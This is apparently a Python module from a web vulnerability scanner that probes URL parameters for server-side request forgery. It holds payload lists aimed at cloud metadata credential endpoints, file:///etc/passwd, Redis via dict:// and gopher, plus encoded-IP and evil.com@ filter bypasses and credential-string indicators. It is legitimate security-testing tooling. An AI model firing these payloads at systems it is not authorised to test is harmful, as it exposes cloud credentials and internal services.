"""SSRF scanner module — cloud metadata endpoints + filter bypass."""
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from app.scanner.crawler import CrawledPage
from app.scanner.http_client import HttpClient
from app.scanner.modules.base import BaseModule, Finding
from app.scanner.modules.registry import ModuleRegistry

URL_PARAMS = {
    "url", "uri", "path", "src", "href", "link", "redirect", "fetch",
    "proxy", "load", "page", "file", "resource", "target", "dest",
    "destination", "image", "feed", "callback", "endpoint", "next",
    "return", "returnurl", "return_url", "forward",
}

# ── Core SSRF payloads (localhost + private IP variants) ─────────────────────
CORE_SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0177.0.0.1",       # Octal IP
    "http://2130706433",       # Decimal IP for 127.0.0.1
    "http://0x7f000001",       # Hex IP
    "http://127.000.000.001",  # Leading zeros
    "http://0.0.0.0",
    "http://127.1",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",  # IPv6-mapped
]

# ── Cloud metadata endpoints ──────────────────────────────────────────────────
CLOUD_METADATA_PAYLOADS = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # AWS IMDSv2 (attempt — will fail without token but 401 is still interesting)
    "http://169.254.169.254/latest/api/token",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
]

# ── Filter bypass variants ────────────────────────────────────────────────────
FILTER_BYPASS_PAYLOADS = [
    # URL encoding
    "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",  # 169.254.169.254 URL encoded
    "http://169.254.169.254.xip.io/latest/meta-data/",         # DNS rebinding-like
    # Protocol variations
    "dict://127.0.0.1:6379/info",          # Redis via dict://
    "file:///etc/passwd",                   # file:// to LFI
    "gopher://127.0.0.1:80/_GET / HTTP/1.0%0d%0a",  # Gopher SSRF
    # IPv6
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
    # Decimal/Octal for 169.254.169.254
    "http://2852039166/latest/meta-data/",  # Decimal
    "http://0251.0376.0251.0376/",          # Octal
    # URL fragments / auth bypass
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1:80@evil.com/",
    # Redirect chains (open redirect → internal)
    "http://127.0.0.1#evil.com",
]

# ── Response indicators of successful SSRF ──────────────────────────────────
SSRF_INDICATORS = [
    # Linux /etc/passwd or proc
    "root:", "/bin/", "daemon:", "/usr/sbin",
    # AWS metadata
    "ami-id", "instance-id", "security-credentials", "iam-info",
    "AccessKeyId", "SecretAccessKey", "Token",
    # GCP metadata
    "computeMetadata", "project-id", "instance/", "serviceAccounts",
    # Azure metadata
    "azEnvironment", "subscriptionId", "resourceGroupName",
    # Redis
    "redis_version", "+PONG", "redis_mode",
    # Generic internal
    "localhost", "127.0.0.1", "169.254.169.254",
    "Connection refused", "No route to host",
    "Internal Server Error",
]


@ModuleRegistry.register
class SsrfModule(BaseModule):
    name = "ssrf"
    description = "Tests for SSRF — cloud metadata, filter bypass, and private IP access"
    scan_modes = ["full"]
    is_active = True

    async def active_test_async(self, page: CrawledPage, http_client: HttpClient) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(page.url)
        query_params = parse_qs(parsed.query)

        ssrf_params = [p for p in query_params if p.lower() in URL_PARAMS]

        for param_name in ssrf_params:
            # Test cloud metadata first (highest value)
            finding = await self._probe_payloads(
                page, param_name, query_params, parsed, http_client,
                CLOUD_METADATA_PAYLOADS, "Cloud Metadata SSRF",
                severity="critical", cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            )
            if finding:
                findings.append(finding)
                continue

            # Core localhost payloads
            finding = await self._probe_payloads(
                page, param_name, query_params, parsed, http_client,
                CORE_SSRF_PAYLOADS, "SSRF - Internal Service Access",
                severity="high", cvss_score=7.5,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            )
            if finding:
                findings.append(finding)
                continue

            # Filter bypass payloads
            finding = await self._probe_payloads(
                page, param_name, query_params, parsed, http_client,
                FILTER_BYPASS_PAYLOADS, "SSRF Filter Bypass",
                severity="high", cvss_score=7.5,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            )
            if finding:
                findings.append(finding)

        return findings

    async def _probe_payloads(
        self, page, param_name, query_params, parsed, http_client,
        payloads, vuln_type, severity, cvss_score, cvss_vector,
    ) -> Finding | None:
        for payload in payloads:
            test_params = {k: v[0] for k, v in query_params.items()}
            test_params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_params), "",
            ))
            try:
                response = await http_client.get(test_url)
            except Exception:
                continue

            for indicator in SSRF_INDICATORS:
                if indicator.lower() in response.text.lower():
                    # Determine confidence by indicator type
                    confidence = "confirmed" if any(
                        kw in indicator for kw in ["AccessKeyId", "ami-id", "computeMetadata", "redis_version"]
                    ) else "tentative"

                    return Finding(
                        module_name=self.name,
                        vuln_type=vuln_type,
                        severity=severity,
                        cvss_score=cvss_score,
                        cvss_vector=cvss_vector,
                        owasp_category="A10",
                        cwe_id="CWE-918",
                        affected_url=page.url,
                        affected_parameter=param_name,
                        description=(
                            f"Parameter '{param_name}' is vulnerable to SSRF. "
                            f"Internal content indicator '{indicator}' found in response to payload '{payload}'."
                        ),
                        remediation=(
                            "Validate and allowlist URL parameters. Block requests to private IP ranges "
                            "(RFC 1918, 169.254.x.x, ::1). Use a dedicated HTTP client with egress filtering. "
                            "Disable follow-redirects or validate redirect destinations."
                        ),
                        confidence=confidence,
                        evidence=[
                            {"type": "payload", "title": "SSRF Payload", "content": payload},
                            {"type": "request", "title": "Test URL", "content": test_url},
                            {"type": "response", "title": "Response Indicator", "content": indicator},
                        ],
                    )
        return None
